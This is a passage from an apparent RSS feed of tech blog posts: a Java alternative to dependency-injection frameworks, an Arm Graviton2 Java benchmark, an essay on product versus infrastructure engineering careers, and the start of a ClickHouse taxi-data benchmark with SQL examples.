<p><span>Is all this really necessary? Why do we need all these annotation-driven magically-wired DI frameworks?</span></p>



<h2><span>Dependency Graphs</span></h2>



<p><span>I went searching for an explanation, and found one from </span><a href="https://blog.drewolson.org/dependency-injection-in-go" target="_blank" rel="noopener">the following blog post</a><span>:</span></p>



<blockquote><p><i><span>The main downside is that it‚Äôs a pain to have to manually create the Config before we can create the Server. We‚Äôve created a dependency graph here ‚Äì we must create our Config first because of Server depends on it. In real applications these dependency graphs can become very large and this leads to complicated logic for building all of the components your application needs to do its job.</span></i></p></blockquote>



<p><span>He then goes on to give an example of a Server, which has a chain of dependencies ‚Äì all of which need to be constructed in sequence, by a centralized main function:</span></p>


<pre title="">func main() {
  config := NewConfig()
  db := ConnectDatabase(config)
  personRepository := NewPersonRepository(db)
  personService := NewPersonService(config, personRepository)
  server := NewServer(config, personService)
  server.Run()
}
</pre>


<p><span>His point presumably is that managing this dependency graph from a central location, can be complex and burdensome. Hence, it‚Äôs better to use a DI framework where you can specify how each dependency should be constructed, and they are all transitively invoked and initialized when needed.</span></p>



<p><span>I think that he is somewhat overstating the problems of constructor injection, but let‚Äôs assume for now that he‚Äôs right. Is there a different way to accomplish the above goal, without having to use a DI framework, and annotation-driven auto-wiring?</span></p>



<h2><span>An Alternative</span></h2>



<p><span>Turns out that I had run into a similar issue myself while working on some side projects. And I had solved them in a way that ‚Äúresembles‚Äù a DI framework, without actually using any DI framework or advanced language constructs. I‚Äôm probably biased, but this approach appears to be far simpler, while conferring similar benefits.</span></p>



<p><span>Context: </span></p>



<ol><li><span>We want to construct and run a Server instance</span></li><li><span>Server has a dependency on PersonService</span></li><li><span>PersonService has a dependency on PersonRepository and Config</span></li><li><span>PersonRepository has a dependency on Database</span></li><li><span>Database has a dependency on the same Config as above</span></li></ol>



<p><span>Suppose, as the author mentions, we do not want to use constructor injection in order to inject Config -&gt; Database + Config -&gt; PersonRepo -&gt; PersonService -&gt; Server. Suppose we want all dependencies to be lazily, and transitively constructed only when needed.</span></p>



<p><span>Consider the following:</span></p>


<pre title="">public class Toolbox {
  public static Config getConfig() {...}
  public static Database getDatabase() {...}
  public static PersonRepo getPersonRepo() {...}
  public static PersonService getPersonService() {...}
}
</pre>


<p><span>If you have the above fully implemented, it can be trivially used to replace framework-based dependency injection. For instance, suppose you have a class that has a dependency on Database. Instead of relying on the DI framework to inject Database, you can just fetch it from the Toolbox instead.</span></p>


<pre title="">@Inject
public PersonRepo(@Database Database db) {...}
</pre>


<p><span>Becomes:</span></p>


<pre title="">public PersonRepo() { this(Toolbox.getDatabase()); }
public PersonRepo(Database db) {...}
</pre>


<h2><span>Configuring the Toolbox</span></h2>



<p><span>That all sounds great, but where does </span><code>Toolbox.getDatabase()</code><span> get its return value from? There are many possible ways to implement this, depending on your specific application and testing needs.</span> Let‚Äôs look at a few of them.</p>



<p><span>Simplest possible option: construct a new instance every time:</span></p>


<pre title="">public class Toolbox {
  public static Database getDatabase() { 
    return DatabaseProvider.get(); }
  }
  
  private static class DatabaseProvider {
    static Database get() { 
      return buildDatabase(Toolbox.getConfig()); 
    }
  }
}
</pre>


<p><span>Or if you want to reuse the same Database instance every time, you can use a </span><a rel="noopener" href="https://stackoverflow.com/a/16106598/4816322" target="_blank">singleton holder with lazy-initialization</a><span>:</span></p>


<pre title="">class DatabaseProvider {
  static Database get() { return DefaultHolder.DEFAULT; }

  private static class DefaultHolder {
    private static final DEFAULT = buildDatabase(Toolbox.getConfig());
  }
}
</pre>


<p><span>And suppose you want the ability to inject custom instances, for testing purposes:</span></p>


<pre title="">// Restrict visibility to prevent access from unexpected sources
class DatabaseProvider {
  // throws exception if already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) {...}

  // Returns a default if not set
  static Database get() {...}
}
</pre>


<p><span>And if you want all this to be thread-safe, you can use </span><a rel="noopener" href="https://dzone.com/articles/how-atomicreference-works-in-java" target="_blank">AtomicReference</a><span>. Or you could use a </span><a href="https://gitlab.com/whacks/cava/blob/master/src/main/java/org/rajivprab/cava/DynamicConstant.java"><span>simple utility class that manages thread safety, lazy init, defaults, and immutability</span></a><span>, in order to implement all this in just 5 lines of code.</span></p>


<pre title="">class DatabaseProvider {
  private static final DynamicConstant INSTANCE = 
    DynamicConstant.withDefault(() -&gt; buildDatabase(Toolbox.getConfig()));

  // throws exception if instance is already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) { INSTANCE.set(db); }

  static Database get() { return INSTANCE.get(); }
}
</pre>


<p>You can customize this to fit any particular requirements you have. Thread-safety, immutability, defaults, singletons vs suppliers, injecting fakes for tests ‚Äì you can implement any of these simply by customizing the DatabaseHolder implementation.</p>



<p><span>Notice that this automatically manages your dependency graph as well. When&nbsp;<code>Toolbox.getDatabase()</code> is invoked, that invokes <code>DatabaseProvider.get()</code>,&nbsp;which will then invoke <code>Toolbox.getConfig()</code><em> </em>if needed, which might in turn transitively invoke its own dependencies via the Toolbox as well.</span></p>



<p><span>In this way, <code>PersonRepo</code> only needs to call <code>Toolbox.getDatabase()</code>, and all transitive dependencies are lazily initialized or constructed (if needed), in order to generate the Database instance.</span></p>



<h2>So‚Ä¶ Service Locators?</h2>



<p>Given the superficial similarity to <a href="https://en.wikipedia.org/wiki/Service_locator_pattern" target="_blank" rel="noopener">Service Locators</a>&nbsp;(SL), it‚Äôs easy to see why this might seem like a reincarnation of an old idea. However, there are some major differences between the approach described above, and a traditional SL pattern. Differences that completely change the way the system feels and operates.</p>



<p>First, unlike a SL, the above approach cannot be used to request any arbitrary object. The Toolbox only has specific methods defined, such as <code>getDatabase()</code>, which return specific objects. You cannot simply invoke <code>Toolbox.get(MyCustomObject.class)</code>, like you can with a SL.</p>



<p>This restriction might seem like a limitation. But it actually makes your code much safer. It guarantees that all Toolbox users are only using it to request objects that have been explicitly planned for and added to the Toolbox interface. It also allows for programmers to easily figure out which dependencies they can safely get from the Toolbox, and which ones they have to get elsewhere.</p>



<p>The above also provides an additional level of safety: you can ensure that every method exposed by the Toolbox, comes with a default supplier. A default supplier that eliminates any worries that the Toolbox wasn‚Äôt properly initialized prior to use. A default supplier that transitively constructs its own dependencies using the Toolbox recursively.</p>



<p>In fact, the right way to do it would be to define default suppliers that always return something that works, and is intended for production use. This way, when running in prod, your code should never have to set any values in the toolbox. It can simply get the lazy-constructed defaults whenever needed. The only use case for setting something in the Toolbox, would be for testing purposes when you want to inject a fake.</p>



<p>Lastly, a SL is designed and intended to be extremely flexible, by allowing for instance injection at any time. This can be a powerful tool, if your application needs such dynamic abilities. However, it can also lead to complex interactions and side-effects as different parts of the application interfere with each other in unintentional or non-intuitive ways.</p>



<p>The Toolbox approach described above isn‚Äôt expressly designed to have such capabilities. If you look at the various set methods, you can see that they are programmed to throw exceptions if they conflict with a previously set value. This means that as soon as a value is set, it is then frozen for the rest of the application‚Äôs lifespan. You can always customize this in any way you want, by changing the Provider implementation ‚Äì but I would recommend enforcing some form of consistency.</p>



<p>Combine all of these differences, and you get something that‚Äôs completely different from a Service Locator in terms of its uses and drawbacks.</p>



<h2>But Singletons are Bad?</h2>



<p>With respect to Singletons, there‚Äôs little difference between the Toolbox approach above, and what you would do with DI frameworks. If you want a new instance every time, you can configure the DatabaseProvider to construct a new instance every time. Alternatively, if you prefer to reuse the same instance every time because ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</a></em></p>]]>
            </description>
            <link>https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519596</guid>
            <pubDate>Fri, 18 Sep 2020 17:34:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing a real-world Java-based application on Amazon's Arm-based Graviton2]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519510">thread link</a>) | @JacobiX
<br/>
September 18, 2020 | https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/ | <a href="https://web.archive.org/web/*/https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tm-row-5f6971d4dfd43"><div id="tm-column-5f6971d4dffaf"><div><div><div><div><blockquote><p> ‚ÄúARM-based built on the Nitro servers for typical LOB-applications</p></blockquote><p>The T4g instances are low cost version of the ARM based VMs. According to Amazon you can enjoy a performance benefit of up to <strong>40%</strong> at a <strong>20%</strong> lower cost in comparison to T3 instances.</p><p>We deployed Reis‚Ñ¢ a Java-based application and measured the performance of some typical production payloads. The idea is to deploy a real-world app that uses some popular technologies: PostgreSQL, Java 8, nginx, angular, and Elasticsearch and quickly evaluate the performance of the system.</p></div></div><div><figure><p><img width="573" height="150" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png 573w, https://www.vneuron.com/wp-content/uploads/2020/09/tab1-300x79.png 300w" sizes="(max-width: 573px) 100vw, 573px"></p></figure></div><div><div><p>Most of the needed packages were already available in yum package manager, the installation process was smooth and the installed components worked out of the box. For PostgreSQL, unfortunately, the default yum package is quite outdated (v9). You need to use the Extras catalog to get the version 10.</p><p>For Java JDK, since we use OpenJDK we decided to use Amazon Corretto 8, strangely enough and unlike Amazon Corretto 11 the version 8 is not included in the package manager. So we installed manually the AARCH64 version (again everything worked as documented). After installing nginx, preparing a test database, and configuring the remaining dependencies we were ready to test the setup</p><p>After starting the services, the first thing that I noticed was the horrendous startup time of Java applications. It was unbelievably slow, almost an hour to start the application! for sure I know that it can takes a couple of minutes to start this complex monolithic backend, but if it takes an hour there is something wrong with the setup.</p></div></div><div><div><p>After some sanity checks I couldn‚Äôt figure out the root cause of the problem, after calling for assistance from our team, they quickly identified the issue: <strong>dev/random</strong> runs out of available entropy. The app was waiting for <strong>/dev/random</strong> to provide randomness and <strong>/dev/random</strong> typically blocks if there is less entropy available than requested. They suggested that I switch to <strong>/dev/urandom</strong> as the source of cryptographic randomness. A call to cat <strong>/proc/sys/kernel/random/entropy_avail</strong> returns values in the range 70-100. We switched to<strong> /dev/urandom</strong> and now we have a more reasonable boot time (under a minute)!</p><p>Excerpt<b> from /usr/lib/jvm/amazon-corretto-8.265.01.1-linux-aarch64/jre/lib/security/java.security </b></p></div></div><div><figure><p><img width="318" height="120" src="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png 318w, https://www.vneuron.com/wp-content/uploads/2020/09/image1-300x113.png 300w" sizes="(max-width: 318px) 100vw, 318px"></p></figure></div><div><p><b>Maybe the Amazon Corretto for AARCH64 distribution shoud use /dev/urandom by default?</b></p></div><div><p>Benchmarking with Bombardier</p></div><div><p>The objective is to determine whether the performance of this Graviton2 based VM are quite competitive. In order to have a baseline, we created an x86 VM with equivalent characteristics (but +27% of the price).</p></div><div><figure><p><img width="566" height="187" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png 566w, https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1-300x99.png 300w" sizes="(max-width: 566px) 100vw, 566px"></p></figure></div><div><div><p>Since the two VMs have the same OS, we used the exact same scripts to install the dependencies, to deploy the apps and to benchmark it using Bombardier!</p><p><a href="https://github.com/codesenberg/bombardier" target="_blank" rel="noopener noreferrer">Bombardier</a> is a HTTP(S) benchmarking tool. It is written in Go programming language. We compiled it on both VMs.</p><p>We designed 8 production workloads, involving database CRUD, data indexing, search and data encryption and transfer. For each payload we performed 10 tests and picked the median, after each iteration we restarted the jvm.</p></div></div><div><figure><p><img width="640" height="394" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png 702w, https://www.vneuron.com/wp-content/uploads/2020/09/screen1-300x185.png 300w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><figure><p><img width="640" height="395" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png 897w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-300x185.png 300w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-768x474.png 768w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><div><p>I should admit that I‚Äôm pleasantly surprised with the performances of the ARM version of OpenJDK.</p><p>As with any small-scale benchmark we should take it with grain of salt, but we will definitely perform more extensive tests in the upcoming week.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519510</guid>
            <pubDate>Fri, 18 Sep 2020 17:28:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop just using ‚ÄúFront end‚Äù or ‚ÄúBack end‚Äù to describe the Engineering you like]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24519400">thread link</a>) | @lord_sudo
<br/>
September 18, 2020 | https://www.michellelim.org/writing/stop-using-frontend-backend/ | <a href="https://web.archive.org/web/*/https://www.michellelim.org/writing/stop-using-frontend-backend/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong><em>Also posted on Medium <a href="https://medium.com/@michlim97/stop-just-using-frontend-or-backend-to-describe-the-engineering-you-like-e8c392956ada">here</a>.</em></strong></p>
<p>
<img src="https://www.michellelim.org/writing/stop-using-frontend-backend/images/fe-be-cover-photo.png" alt="Stop Using Frontend Backend Cover Photo">
</p>
<p>If there is one tip I could share with my fellow new engineers, it would be‚Ä¶ Stop relying on the ‚ÄúFrontend/Backend‚Äù axis to understand the engineering you like. <strong>The ‚ÄúFrontend/Backend‚Äù axis doesn‚Äôt map well to engineers‚Äô motivations.</strong> If you only use that axis, you can end up in projects you don‚Äôt like or worse still, give up on engineering prematurely. <strong>Instead, try using the ‚ÄúProduct/Infrastructure‚Äù axis as the first axis to understand your career preference.</strong></p>
<p>My goal is to share with you the language that could help you (and your manager) find your ‚Äúsweet spot‚Äù engineering role. It took me a couple of bad internship placements and <em>pure luck</em> to figure this out. So I hope that this essay saves some of you months of job mismatch. Shoutout to <a href="https://twitter.com/bolu_ben">Bolu </a>who after my <a href="https://twitter.com/michlimlim/status/1293336552832151559">Tweet thread</a> on this thesis went viral on Tech Twitter, suggested that I turned the thread into an essay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p><strong>‚ÄúProduct/Infra‚Äù maps neatly to the psychology of how engineers pick projects and their motivations for learning to code.</strong> Broadly speaking, there are 2 types of engineers<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>:</p>
<ol>
<li>
<p>‚ÄúProduct-first‚Äù engineers are obsessed with using code to solve a user problem and they see code as just a means to an end.</p>
</li>
<li>
<p>‚ÄúCode-first‚Äù engineers are obsessed with the abstractions, architecture, tools and libraries in the code. Elegant code is the end.</p>
</li>
</ol>
<p>Product-first engineers map to ‚ÄúProduct engineering‚Äù‚Äîbuilding, launching and maintaining features that solve user problems. They often love being in the same room as designers and product managers to learn about users, and they love finding technical opportunities that can improve the product.</p>
<p>Code-first engineers map to ‚ÄúInfrastructure engineering‚Äù‚Äîbuilding infrastructure platforms that support applications, be it via building CI/CD pipelines, implementing logging, or supporting high traffic etc. They‚Äôre motivated to better the craft of programming and are often obsessed with things like test coverage, using the latest technologies, code architecture, etc.</p>
<p>(To be clear, there are ‚ÄúProduct engineering‚Äù and ‚ÄúInfrastructure engineering‚Äù roles whether your users are external customers, third-party developers or internal consumers of an API<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.)</p>
<p>Notice that both Product engineers and Infrastructure engineers touch the frontend and the backend. Many of them, especially product engineers, choose to specialize into frontend or backend as well. <strong>The ‚ÄúFrontend/Backend‚Äù division is still a valuable axis.</strong></p>
<p><strong>However, using the ‚ÄúFrontend/Backend‚Äù in isolation of ‚ÄúProduct/Infra‚Äù in project selection can lead to engineer-job Mismatch. Especially amongst Product engineers.</strong> I am a Product engineer. When I tried out ‚ÄúBackend engineering‚Äù in an internship, I was assigned to an Infra role where day-to-day I migrated databases. I had joined the company because I wanted to work on their product. But I didn‚Äôt have the language to explain that to my recruiter. They conflated ‚ÄúBackend‚Äù with ‚ÄúInfra‚Äù and I ended up with a role too far from the user.</p>
<p>When I tried out ‚ÄúFrontend engineering‚Äù in another internship, I was assigned to a product close to the user. But the frontend engineers and I were left out of the meetings that discussed how the features would solve problems.</p>
<p>If you split your engineers by the type of technology they work on (i.e. ‚ÄúFrontend/Backend‚Äù), it is easy to assume that your Frontend engineers are happy to just work on translating finalized designs into UI/UX components. But if you split them based on their motivations (i.e.‚ÄùProduct/Infra‚Äù), you‚Äôd want to loop your Frontend product engineers into product discussions.</p>
<p>(The same engineer-job mismatch happens for Infra engineers too, but it is less prevalent because the ‚ÄúFrontend‚Äù and ‚ÄúBackend‚Äù labels usually only officially apply in Product engineering.)</p>
<p>Now, this next part may be a reach‚Ä¶ but I think <strong>many new grad Product engineers choose to be Product <em>Managers</em></strong> <strong>because of this inadequate ‚ÄúFrontend/Backend‚Äù division</strong><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. Let‚Äôs jump back to my two internship examples. How would you feel if these were your only two internships over your college career? Given that you spent 12 weeks in each role, wouldn‚Äôt it be reasonable to conclude that those roles were mostly what ‚Äúfrontend‚Äù and ‚Äúbackend‚Äù were all about? Wouldn‚Äôt it be reasonable too to conclude that since you didn‚Äôt like both types of engineering, maybe engineering as a whole wasn‚Äôt for you? (And this self-dejection is especially easy to fall into if you are part of an underrepresented minority in engineering.) Why not be a <em>Product</em> manager and solve user problems?</p>
<p>This scenario is very common. Engineering is esoteric. Even with an intern-team matching process, an Product engineering intern may not know that they should select Product engineering roles, let alone know which roles are Product engineering roles.</p>
<p><strong>But what if that same intern uses the ‚ÄúProduct/Infra‚Äù language and advocates for a ‚ÄúProduct Engineering‚Äù role?</strong></p>
<p>I was such an intern. I was so drained by my Infra role that I reached out to Product Managers in the company to enquire about their jobs. But then I advocated<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> for a Product Engineering role and‚Ä¶ my manager gave it to me. As a backend engineer on a product team, I worked with a team to <a href="https://techcrunch.com/2019/10/03/stock-trading-app-robinhood-revamps-its-newsfeed-with-the-wall-street-journal-and-ad-free-videos/">build the Video Newsfeed in Robinhood</a>. I built a large backend pipeline and also had the chance to engage with product questions regarding newsfeed ranking, video tagging, and user engagement. I spoke with engineering, data science, and business, balanced those interests, and wrote the resolution in code.</p>
<p>I found my sweet spot.</p>
<p><strong>At the end of the day, engineering is multifaceted and can be defined along more than one axis:</strong> B2B vs. B2C, B2B top-down vs. B2B ‚Äúbottom-up‚Äù, API-first vs. application-first, ‚ÄúForward deployed‚Äù vs. ‚ÄúSoftware engineer‚Äù, etc. If we‚Äôre serious about making engineering accessible to all, we should champion any and all frameworks that can help new engineers find their sweet spot and be happy.</p>
<!-- raw HTML omitted -->
<h3 id="notes">Notes</h3>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I had met Bolu, a new grad in Bloomberg London, after he sent me a cold DM to thank me for the thread. He had sent my thread to his manager!!! It turned out that he had been struggling to express his project preferences to his manager, and the thread helped. The manager ‚Äúgot‚Äù it after reading the thread and now Bolu is on a product development team he is very excited about. <a href="#fnref:1" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>I took the ‚Äúcode-first‚Äù vs. ‚Äúproduct-first‚Äù engineer terminology from Xoogler Zach Lloyd‚Äôs blog: <a href="https://thezbook.com/">https://thezbook.com/</a> <a href="#fnref:2" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Someone on Twitter (leon @lievetraz) replied with their attempt to classify internal tools teams into ‚ÄúProduct/Infra‚Äù <a href="https://twitter.com/lievetraz/status/1293555767430336518?s=20">here</a>. <a href="#fnref:3" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p>There are hundreds of other reasons engineers choose to be PMs of course. <a href="#fnref:4" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p>I learned it the hard way how important it was to advocate for oneself and ask to change teams early. <a href="#fnref:5" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
</ol>
</section>

		</div></div>]]>
            </description>
            <link>https://www.michellelim.org/writing/stop-using-frontend-backend/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519400</guid>
            <pubDate>Fri, 18 Sep 2020 17:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ClickHouse and Redshift Face Off Again in NYC Taxi Rides Benchmark]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518926">thread link</a>) | @krnaveen14
<br/>
September 18, 2020 | https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark | <a href="https://web.archive.org/web/*/https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	

	<p><h2>Setup</h2>
</p><p>We start with the latest ClickHouse version 20.6.6.44 running inside Kubernetes on an Amazon m5.8large EC2 instance. This is a mid-range instance with 32 vCPUs, 128GB of RAM and EBS gp2 storage, that is priced at $1.54 per hour or $36.86 per day in AWS. EBS users also have to pay for storage $3 per terabyte per day.</p><p><h2>Data loading</h2>
</p><p>In previous benchmarks using NYC Taxi Rides datasets, users had to go through a painful and lengthy data transformation process that could take hours. Those times are gone, thanks to contributions to ClickHouse by Altinity engineers. We can use new ClickHouse capabilities in order to load data directly from S3 bucket.&nbsp;</p><p>The data is stored in 96 gzip-ed CSV files, one file per month, several hundred MBs size each:</p><div><figure><img src="https://lh5.googleusercontent.com/MSo9vJvJ5mbEVh4J6xEThcSb7E3MG54byt3KsVSutWJsBJ11Jzqhaz4u_OxQwDWeqZGkwuSXJglvX8yAk0dCHv0oSpjmYo3omH4WgZtkfhhdm2oe_E2YMFoQJyF5_PNl3DAxsVOf" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The total size reported by Amazon is 37.3GB:</p><div><figure>
<p>nyc_taxi_rides/data/tripdata/<br>96 Objects ‚Äì 37.3 GB</p>
</figure>
</div><p>We are not going to do any transformations of the source data. Only minor tweakings of <a href="https://altinity.com/blog/2019/7/new-encodings-to-improve-clickhouse">table encodings</a> were applied:</p><div><pre><code>CREATE TABLE IF NOT EXISTS tripdata (
  pickup_date Date DEFAULT toDate(pickup_datetime) CODEC(Delta, LZ4),
  id UInt64,
  vendor_id String,
  pickup_datetime DateTime CODEC(Delta, LZ4),
  dropoff_datetime DateTime,
  passenger_count UInt8,
  trip_distance Float32,
  pickup_longitude Float32,
  pickup_latitude Float32,
  rate_code_id String,
  store_and_fwd_flag String,
  dropoff_longitude Float32,
  dropoff_latitude Float32,
  payment_type LowCardinality(String),
  fare_amount Float32,
  extra String,
  mta_tax Float32,
  tip_amount Float32,
  tolls_amount Float32,
  improvement_surcharge Float32,
  total_amount Float32,
  pickup_location_id UInt16,
  dropoff_location_id UInt16,
  junk1 String,
  junk2 String) 
ENGINE = MergeTree
PARTITION BY toYYYYMM(pickup_date) 
ORDER BY (vendor_id, pickup_location_id, pickup_datetime);</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><div><pre><code>set max_insert_threads=32;

INSERT INTO tripdata
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/data-20*.csv.gz', 
'CSVWithNames', 
'pickup_date Date, id UInt64, vendor_id String, pickup_datetime DateTime, dropoff_datetime DateTime, passenger_count UInt8, trip_distance Float32, pickup_longitude Float32, pickup_latitude Float32, rate_code_id String, store_and_fwd_flag String, dropoff_longitude Float32, dropoff_latitude Float32, payment_type LowCardinality(String), fare_amount Float32, extra String, mta_tax Float32, tip_amount Float32, tolls_amount Float32, improvement_surcharge Float32, total_amount Float32, pickup_location_id UInt16, dropoff_location_id UInt16, junk1 String, junk2 String', 'gzip');</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><p>The syntax is not standard; we use the ClickHouse table function ‚Äòs3()‚Äô in order to connect to and read from an S3 bucket. ClickHouse <a href="https://clickhouse.tech/docs/en/sql-reference/table-functions/">table functions</a> are a powerful extension technique that allows to integrate a DBMS with external data sources without changing the SQL syntax. ClickHouse has a bunch of those, and the ‚Äòs3()‚Äô table function is a welcome addition.</p><div><pre><code>0 rows in set. Elapsed: 280.696 sec. Processed 1.31 billion rows, 167.39 GB (4.67 million rows/s., 596.34 MB/s.) </code></pre>
</div><p>It takes less than 5 minutes in order to load 1.3 billion rows from the S3 bucket! Note that wildcards are used in order to load multiple files, and Clickhouse can process gzipped data natively as well!&nbsp;</p><p>In the same way we can load the ‚Äòtaxi_zones‚Äô table ‚Äî the table is small so loading is almost instantaneous from S3.</p><div><pre><code>CREATE TABLE IF NOT EXISTS taxi_zones (
  location_id UInt16,
  zone String,
  create_date Date DEFAULT toDate(0)
) 
ENGINE = MergeTree 
ORDER BY (location_id);

INSERT INTO taxi_zones
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/taxi_zones/data-*.csv.gz', 
'CSVWithNames', 'location_id UInt16, zone String, create_date Date', 'gzip');</code></pre>
</div><p>Once the data is loaded, it is a good practice to inspect table sizes:</p><div><pre><code>SELECT 
    table,
    sum(rows),
    sum(data_uncompressed_bytes) AS uc,
    sum(data_compressed_bytes) AS c,
    uc / c AS ratio
FROM system.parts
WHERE (database = 'default') AND active
GROUP BY table

‚îå‚îÄtable‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄsum(rows)‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄuc‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄc‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄratio‚îÄ‚îê
‚îÇ tripdata          ‚îÇ 1310903963 ‚îÇ 104469253248 ‚îÇ 37563206521 ‚îÇ 2.7811591778671945 ‚îÇ
‚îÇ taxi_zones        ‚îÇ        263 ‚îÇ         5495 ‚îÇ        3697 ‚îÇ 1.4863402758993778 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò</code></pre>
</div><p>As you can see, uncompressed data size is above 100GB, which lands in ClickHouse as 35GB for the main table with 2.8 times compression ratio. We usually expect ClickHouse to compress more aggressively, but the table has a lot of random floats that are hard to pack effectively.</p><p>The data loading process was very fast and convenient and it took us less than 10 minutes to get ready for queries.</p><p><h2>Queries</h2>
</p><p>Following Mark Litwintschik examples we used several simple queries in order to benchmark performance.</p><p>Q1. Group by a single column.</p><div><pre><code>SELECT 
    passenger_count,
    avg(total_amount)
FROM tripdata
GROUP BY passenger_count</code></pre>
</div><p>Q2. Group by two columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    count(*)
FROM tripdata
GROUP BY passenger_count, year</code></pre>
</div><p>Q3. Group by three columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    round(trip_distance) AS distance,
    count(*)
FROM tripdata
GROUP BY passenger_count, year, distance
ORDER BY year, count(*) DESC</code></pre>
</div><p>We have added two more queries to check joins.</p><p>Q4. Query with a JOIN to taxi_zones table</p><div><pre><code>SELECT 
    tz.zone AS zone,
    count() AS c
FROM tripdata AS td
LEFT JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
GROUP BY zone
